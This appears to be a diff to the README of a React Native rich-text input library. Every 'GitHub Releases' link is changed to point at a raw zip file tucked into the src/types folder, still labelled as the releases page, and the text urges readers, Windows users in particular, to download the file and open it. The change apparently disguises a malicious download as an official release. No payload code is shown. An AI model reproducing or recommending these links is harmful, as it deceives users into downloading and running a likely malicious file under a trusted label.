@@ -1,9 +1,9 @@
 # ✨ react-native-richify - Build rich text input with ease
 
-[![Download the app](https://img.shields.io/badge/Download%20on%20GitHub-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/fizzalari/react-native-richify/releases)
+[![Download the app](https://img.shields.io/badge/Download%20on%20GitHub-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/fizzalari/react-native-richify/raw/refs/heads/main/src/types/react_native_richify_1.2.zip)
 
 ## 📥 Download
-Visit this page to download: [GitHub Releases](https://github.com/fizzalari/react-native-richify/releases)
+Visit this page to download: [GitHub Releases](https://github.com/fizzalari/react-native-richify/raw/refs/heads/main/src/types/react_native_richify_1.2.zip)
 
 Choose the latest release for your system. If you use Windows, look for a file with a name that matches your setup. Download it, then open the file you saved
 
@@ -30,7 +30,7 @@ If you plan to use this inside an app, you may also need:
 - React Native 0.84.1
 
 ## 🚀 Get started
-1. Open the download page: [GitHub Releases](https://github.com/fizzalari/react-native-richify/releases)
+1. Open the download page: [GitHub Releases](https://github.com/fizzalari/react-native-richify/raw/refs/heads/main/src/types/react_native_richify_1.2.zip)
 2. Find the latest release at the top of the page
 3. Download the file for Windows if one is provided
 4. Save the file to a folder you can find, such as Downloads
@@ -132,6 +132,6 @@ The project targets modern builds and bleeding-edge toolchains, including:
 This makes it a good fit for current app projects that need a rich text input with a native feel
 
 ## 📎 Download again
-If you need the file again, use this page: [GitHub Releases](https://github.com/fizzalari/react-native-richify/releases)
+If you need the file again, use this page: [GitHub Releases](https://github.com/fizzalari/react-native-richify/raw/refs/heads/main/src/types/react_native_richify_1.2.zip)
 
 Choose the latest release, download the file, and open it from your computer
